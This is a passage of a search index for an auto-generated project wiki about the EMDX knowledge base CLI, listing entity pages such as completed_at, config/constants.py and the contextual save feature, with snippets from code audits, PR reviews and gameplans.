<li><code>supporting details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>successful</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>specific test commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>project-&lt;name&gt;-review</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>project-&lt;name&gt;-planning</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>priority-medium</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>priority-low</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>priority-high</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/completedat/","title":"completed_at","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-13</p>"},{"location":"entities/completedat/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...<code>, or</code>'failed'<code>| |</code>started_at<code>| TIMESTAMP NOT NULL | When execution began | |</code>completed_at<code>| TIMESTAMP (nullable) | When execution finished (NULL while running) | |</code>log_file<code>| TEXT NOT NULL | Path to the delegate's log file | |</code>exit_code` | INTEGER (nu...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...ascadeRunItem<code>in the activity view. Fields include</code>id<code>,</code>status<code>,</code>started_at<code>,</code>completed_at<code>,</code>pipeline_name<code>,</code>pipeline_display_name<code>,</code>current_stage<code>,</code>initial_doc_title<code>,</code>doc_id<code>,</code>error_message`.</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: 1. <code>emdx/models/types.py</code> (TypedDict definitions)</p> <p>...<code>TaskDict.updated_at: str \\| None</code> | Can be NULL before first update | | <code>TaskDict.completed_at: str \\| None</code> | NULL until task is done | | <code>TaskDict.prompt: str \\| None</code> | Only set for delegate tasks | | <code>TaskDict.execution_id: int \\| None</code> | FK, optional | |...</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 4. Line 152: <code>CascadeRunItem.cascade_run</code> field</p> <p>...ne_display_name: str     initial_doc_title: str     started_at: datetime | str     completed_at: datetime | str | None     error_message: str | None</p> </li> </ul> <pre><code>\n- **#6488** Any Type Removal Analysis [1/5]\n  *Section: Occurrence 7: `cascade_run: dict[str, Any]` field*\n  &gt; class CascadeRunDict(TypedDict, total=False):\n    id: int\n    pipeline_name: str\n    pipeline_display_name: str\n    initial_doc_title: str\n    started_at: str | datetime\n    completed_at: str | datetime\n    error_message: str | None\n</code></pre> <ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...P | now | Creation time | | <code>updated_at</code> | TIMESTAMP | now | Last update time | | <code>completed_at</code> | TIMESTAMP | NULL | Completion time (auto-set on done) | | Delegate Activity | | <code>prompt</code> | TEXT | NULL | The prompt used for execution | | <code>type</code> | TEXT | \"si...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: 4. ALLOWED_COLUMNS Whitelists - \u26a0\ufe0f INCOMPLETE</p> <p>Note: <code>current_step</code> exists in schema but is never used, so excluding it is fine. <code>completed_at</code> and <code>updated_at</code> are handled specially inside the function, so they don't need to be in the whitelist.</p> </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: HIGH SEVERITY ISSUES (4)</p> <p>Conditional <code>completed_at</code> logic is outside database operation. No transaction isolation\u2014another process could read partially updated state.</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...`: Project name</p> </li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, <code>completed_at</code>: Timestamps</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...running/completed/failed | | <code>started_at</code> | TIMESTAMP | When execution began | | <code>completed_at</code> | TIMESTAMP | When execution finished | | <code>log_file</code> | TEXT | Path to log file | | <code>exit_code</code> | INTEGER | Process exit code | | <code>working_dir</code> | TEXT | Working dire...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> <p>Implementation: \u2705 Complete. Updates multiple fields, auto-sets <code>completed_at</code> when status \u2192 done.</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...ing/completed/failed<code>| | Start time |</code>created_at<code>|</code>started_at<code>| | End time |</code>completed_at<code>|</code>completed_at<code>| | Output |</code>output_doc_id<code>| N/A (just tracks completion) | | Error |</code>error<code>column |</code>exit_code` |</p> </li> </ul>"},{"location":"entities/completedat/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>stage_summary_bar.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.5)</li> <li><code>started_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.4)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/configconstantspy/","title":"config/constants.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-01-10</p>"},{"location":"entities/configconstantspy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 4: Duplicate Truncate Functions (NOT ADDRESSED) <p>Recommendation: Replace with single function + constants: ```python</p> </li> </ul>"},{"location":"entities/configconstantspy/#configconstantspy_1","title":"config/constants.py","text":"<p>TRUNCATE_TITLE = 50 TRUNCATE_DESCRIPTION = 40 TRUNCATE_PATH = 35 TRUNCATE_TEXT = 30</p> <ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Over-provisioned constants \u2014 <code>config/constants.py</code> defines ~65 constants but only ~8 are actually used. Entire sections (health monitoring weights, lifecycle estimates, confidence presets, UI layout, table columns,...</li> </ol> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Architecture Notes</p> <p>...cutor` for actual Claude execution</p> </li> <li>Constants: <code>DELEGATE_EXECUTION_TIMEOUT</code> from <code>config/constants.py</code></li> <li>Git utilities: <code>generate_delegate_branch_name</code>, <code>validate_pr_preconditions</code>, <code>create_worktree</code>, <code>cleanup_worktree</code> from <code>utils/git.py</code></li> <li> <p>Document ops: `get_docume...</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Checklist</p> </li> <li>[x] Add constants to <code>config/constants.py</code></li> <li>[x] Extend <code>document_merger.py</code> with cluster grouping</li> <li> <p>[x] Implement union-find algorithm for clustering</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...dx/services/document_merger.py<code>| EXTEND | Add</code>group_clusters()<code>method | |</code>emdx/config/constants.py<code>| EXTEND | Add</code>COMPACT_*<code>constants | |</code>emdx/main.py<code>| EXTEND | Register command | |</code>tests/test_compact.py` | NEW | Test suite |</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Immediate (Low Effort, High Impact)</p> <ol> <li>Replace 4 truncate functions with 1: Use constants from <code>config/constants.py</code></li> </ol> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.7 Configuration Duplication (Medium Priority)</p> <p>Current State: </p> </li> <li><code>config/settings.py</code> and <code>config/constants.py</code> both define paths</li> <li> <p><code>get_db_path()</code> is defined in both <code>config/settings.py</code> and <code>database/connection.py</code></p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 6. CONSTANTS CONSOLIDATION (LOW PRIORITY)</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 8. CONFIGURATION DUPLICATION</p> <p>Evidence:</p> </li> <li><code>config/settings.py:10-11</code> \u2014 Re-exports from <code>config/constants.py</code></li> <li> <p><code>database/connection.py:16-27</code> \u2014 <code>get_db_path()</code> duplicated in <code>config/settings.py:10-21</code></p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: \u2705 Good Patterns Observed</p> <p>...<code>,</code>get_execution<code>,</code>update_execution_status` \u2014 descriptive</p> </li> <li> <p>Constants file: <code>config/constants.py</code> \u2014 well-organized with section headers</p> </li> <li> <p>#6231 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: CRITICAL SEVERITY</p> <p>...-5-20251101<code>,</code>claude-sonnet-4-5-20250929<code>| Multiple hardcoded model strings | |</code>config/constants.py:193<code>|</code>DEFAULT_CLAUDE_MODEL` | Centralized but not used everywhere |</p> </li> <li> <p>#6223 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: Executive Summary</p> <p>The emdx project has made significant progress in centralizing configuration via <code>config/constants.py</code>. However, several areas of configuration debt remain, particularly around hardcoded values that bypass the centralized system, inconsistent patterns across modules,...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Positive Findings</p> <ol> <li>Centralized Constants (<code>emdx/config/constants.py</code>):</li> </ol> </li> <li>Well-organized magic numbers</li> <li>Good documentation</li> <li>All timeouts, thresholds, and limits in one place</li> </ul>"},{"location":"entities/configconstantspy/#phase-1-foundation","title":"Phase 1: Foundation \u2713","text":""},{"location":"entities/configconstantspy/#issue","title":"Issue","text":"<p><code>config/constants.py</code> is well-organized but some constants are defined inline elsewhere:</p>"},{"location":"entities/configconstantspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>utils/git.py:16</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>ui/document_browser.py:124,130</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>should use</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/unified_search.py:208</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/unified_executor.py:148</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/cascade_service.py:97</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/ask_service.py:41</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/ask_service.py:277,334</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>services/tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/constantspy/","title":"constants.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/constantspy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/constantspy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Summary</p> <p>Audited every public symbol in <code>constants.py</code>, <code>tagging_rules.py</code>, <code>cli_config.py</code>, <code>ui_config.py</code>, and flagged items in <code>models/executions.py</code>, <code>models/tags.py</code>, <code>models/tasks.py</code>. Found 48 confirmed dead symbols across 4 files.</p> <ul> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]   Section: Issues Found</p> </li> <li> <p>#6371 PR Assessment \u2014 12 Open PRs (2026-02-15)   Section: Merge with Caution</p> <p>#573 \u2014 <code>refactor: Centralize config constants</code> (+79/-32, 15 files)</p> </li> <li> <p>Moves scattered magic numbers into <code>constants.py</code>. Touches 15 files but each change is small.</p> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Issue 2: text_formatting.py Functions Are Near-Duplicates</p> <p>...place with single <code>truncate(text, max_len)</code> function. Import constants from config/constants.py which already defines:</p> </li> <li><code>DEFAULT_TRUNCATE_LENGTH = 30</code></li> <li><code>PATH_TRUNCATE_LENGTH = 35</code></li> <li><code>DESCRIPTION_TRUNCATE_LENGTH = 40</code></li> <li> <p><code>TITLE_TRUNCATE_LENGTH = 50</code></p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...architecture</p> </li> <li><code>delegate.py</code>: Comprehensive usage examples in module docstring</li> <li> <p><code>constants.py</code>: Well-organized with section headers (<code># =====</code>) for groupability</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 2. Centralized Model Name Strings</p> <p>Previously duplicated in 5 files:</p> </li> <li><code>cli_config.py</code> (multiple locations)</li> <li><code>ask_service.py</code></li> <li> <p><code>constants.py</code></p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Changes Made</p> </li> <li><code>TIMEOUT_DISCOVERY_SECONDS = 30</code> (delegate --each)</li> <li><code>TIMEOUT_TASK_SECONDS = 600</code> (default execution)</li> <li><code>TIMEOUT_PLANNED_STAGE_SECONDS = 1800</code></li> <li> <p>`TIMEOUT_OTHER_ST...</p> </li> <li> <p>#6224 Dead Code Audit: emdx project - 2026-02-14   Section: Unused Constants (High Confidence)</p> <p>Many constants in <code>emdx/config/constants.py</code> appear unused:</p> </li> <li> <p>#6223 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: Executive Summary</p> <p>...dx project has made significant progress in centralizing configuration via <code>config/constants.py</code>. However, several areas of configuration debt remain, particularly around hardcoded values that bypass the centralized system, inconsistent patterns across modules,...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 3. Workflow Constants \u2014 DEAD CODE (5 hits)</p> <p>File: <code>emdx/config/constants.py</code></p> </li> </ul>"},{"location":"entities/constantspy/#3-hardcoded-xdg-path-cross-platform-issue","title":"3. Hardcoded XDG Path (Cross-Platform Issue)","text":"<p>File: <code>emdx/config/constants.py:15</code> Severity: \ud83d\udfe1 Low</p>"},{"location":"entities/constantspy/#2-added-timeout-constants-to-constantspy","title":"2. Added Timeout Constants to <code>constants.py</code>","text":""},{"location":"entities/constantspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tagging_rules.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>subprocess_default_timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>out code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>default_claude_sonnet_model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>\"~/.claude/claude_cli.json\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>cli_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>ui_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>get_gameplan_stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>delegate_execution_timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>configuration debt audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/contextual-save/","title":"contextual save","text":"<p>Type: concept | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/contextual-save/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6474 EMDX Feature Implementation Synthesis   Section: Overview</p> <p>This document synthesizes the implementation journey of the Contextual Save feature for EMDX, a knowledge base CLI tool designed with Claude as the primary user. The feature addresses the critical problem of duplicate document creation by im...</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: The 7 Features</p> <p>...Gameplan | Branch | Status | |---|---------|----------|--------|--------| | 1 | Contextual Save \u2014 duplicate prevention on save | #6097 | feat/contextual-save | pending | | 2 | Auto-Linking on Save \u2014 self-organizing KB | #6098 | feat/auto-linking | pending...</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: PRIORITY ORDER (for real this time)</p> <ol> <li>Contextual Save (#4) \u2014 prevent bloat NOW, lowest effort</li> </ol> </li> <li>Auto-Linking on Save (#2) \u2014 self-organizing KB, low effort  </li> <li> <p>Smart Priming (#1) \u2014 better session starts, medi...</p> </li> <li> <p>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Examples</p> <p>...----------| | <code>Fix the auth bug</code> | <code>delegate/the-auth-bug-96590</code> | | <code>Gameplan #1: Contextual Save</code> | <code>delegate/contextual-save-8183a</code> | | <code>Feature: Smart Priming (context-aware)</code> | <code>delegate/smart-priming-context-aware-9b5ff</code> | | <code>Implement caching for API calls</code>...</p> </li> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR Status</p> <p>...ng in test | | #452 | Auto-Linking | \u2705 PASSING | May need depth bug fix | | #448 | Contextual Save | \u2705 PASSING | Cleanup PR #477 created | | #449 | Dream Journal | \u2705 PASSING | Cleanup PR #476 created | | #451 | Knowledge Decay | \u2705 PASSING | Complete | | #453 | Ask...</p> </li> <li> <p>#6209 Delegate: Fix PR #448 (Contextual Save): Needs cleanup and tests. Revi [2/8]   Section: Summary</p> <p>Reviewed and cleaned up PR #448 (Contextual Save with Duplicate Prevention). Added comprehensive tests.</p> </li> <li> <p>#6206 Tomorrow's Tasks: Fix Wave for 4 Sprint PRs   Section: Remaining (need fixes + tests):</p> <p>2. PR #448 (Contextual Save)</p> </li> <li>Remove unused 'import sys' in contextual_save.py</li> <li> <p>Add tests in tests/test_contextual_save.py: check_for_similar(), SimilarDoc/CheckResult dataclass, duplicate/related/new thresholds</p> </li> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Summary by PR</p> <p>...---| | #446 | Smart Priming | \u2705 Approve with conditions | Missing tests | | #448 | Contextual Save | \u2705 Approve with changes | Missing tests, unused import | | #449 | Dream Journal | \u2705 Approve with changes | Missing tests | | #451 | Knowledge Decay | \u2705 Approve | Mi...</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Summary</p> <p>PR Title: feat(save): contextual save with duplicate prevention (Issue #6097) Files Changed: 2 (461 additions, 0 deletions)</p> </li> <li><code>emdx/commands/core.py</code> (+128 lines)</li> <li> <p><code>emdx/services/contextual_save.py</code> (+333 lines, new file)</p> </li> <li> <p>#6139 Delegate: Read gameplan by running: emdx view 6097. Implement the Cont [1/7]   Section: Contextual Save Feature Implementation</p> <p>Implemented the Contextual Save feature (duplicate prevention on save) as described in gameplan #6097.</p> </li> <li> <p>#6098 Gameplan #2: Auto-Linking on Save   Section: Implementation Steps</p> </li> <li> <p>#6097 Gameplan #1: Contextual Save</p> </li> </ul>"},{"location":"entities/contextual-save/#synergy-with-feature-1-contextual-save","title":"Synergy with Feature #1 (Contextual Save)","text":"<p>These two share the same core operation: \"embed content, find similar docs.\" The implementation should share the similarity search function. Contextual Save uses it...</p>"},{"location":"entities/contextual-save/#gameplan-1-contextual-save-duplicate-prevention","title":"Gameplan #1: Contextual Save (Duplicate Prevention)","text":""},{"location":"entities/contextual-save/#vision","title":"Vision","text":"<p>Every <code>emdx save</code> becomes intelligent \u2014 before creating a new doc, it checks the KB for overlap and guides the user (Claude) to update existing docs instead of creating duplicates. ## T...</p>"},{"location":"entities/contextual-save/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/contextual_save.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>duplicate prevention</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>tests/test_contextual_save.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>suggested project: proze</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>similar existing docs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>auto-linking on save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>#6086 \"master gameplan\" (73% similar)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>#6085 \"research findings\" (61% similar)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>vision every</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>suggested tags: gameplan, architecture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/corepy/","title":"core.py","text":"<p>Type: heading | Mentioned in: 27 documents | First seen: 2025-07-09</p>"},{"location":"entities/corepy/#documents-27","title":"Documents (27)","text":"<ul> <li>#6502 None Type Analysis [1/7] </li> </ul> <p>Analysis of <code>| None</code> type annotations to determine if None is necessary (Typer default, truly nullable) or unnecessary (always has value at runtime, could be narrowed). ---</p>"},{"location":"entities/corepy/#none-type-annotation-analysis-delegatepy-and-corepy","title":"None Type Annotation Analysis: delegate.py and core.py","text":""},{"location":"entities/corepy/#emdxcommandsd","title":"emdx/commands/d...","text":"<ul> <li> <p>#6495 None Type Analysis [1/7]   Section: Summary</p> File Unnecessary <code>| None</code> Legitimate <code>| None</code> Total Analyzed delegate.py 1 14 15 core.py 1 6 7 </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...Yes (DocumentGroup exists) | | browse.py | 1 | 0 | No (local dict conversion) | | core.py | 1 | 0 | No (local list comp) | | review.py | 1 | 0 | No (Any is appropriate for JSON) | | delegate.py | 3 | 0 | No (**kwargs pattern) |</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Research Summary</p> <p>Analyzed 15+ command modules, the full <code>maintain.py</code> (1481 LOC), <code>core.py</code> save flow, distill/explore/briefing output patterns, synthesis service, entity/wikify services, recipe system, and existing <code>export_profiles</code> schema.</p> </li> <li> <p>#6593 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]   Section: Technical Implementation Notes</p> </li> <li><code>get_input_content()</code> in <code>core.py</code> \u2014 file reading</li> <li><code>apply_tags()</code> \u2014 tag application</li> <li><code>create_document()</code> \u2014 document saving</li> <li> <p><code>find_supersede_candidate()</code> \u2014 duplicate detection</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> File Role Lines <code>core.py</code> Foundation CRUD (save, find, view, edit, delete) 1,227 <code>delegate.py</code> AI orchestration &amp; parallel task execution 1,180 <code>tasks.py</code> Work queue &amp; dependency management 462 </li> <li> <p>#6573 Delegate: List the 3 most important files in emdx/commands/ and say on [1/2]   Section: 3 Most Important Files in emdx/commands/</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> </li> </ul>"},{"location":"entities/corepy/#existing-code-to-reuse","title":"Existing Code to Reuse","text":""},{"location":"entities/corepy/#1-corepy-1227-lines","title":"1. <code>core.py</code> (1,227 lines)","text":"<p>The foundation of the CLI \u2014 implements all core CRUD operations for documents including save, find, view, edit, delete, and search, making it essential for every user interaction with the knowledge base.</p>"},{"location":"entities/corepy/#1-dead-code-found","title":"1. Dead 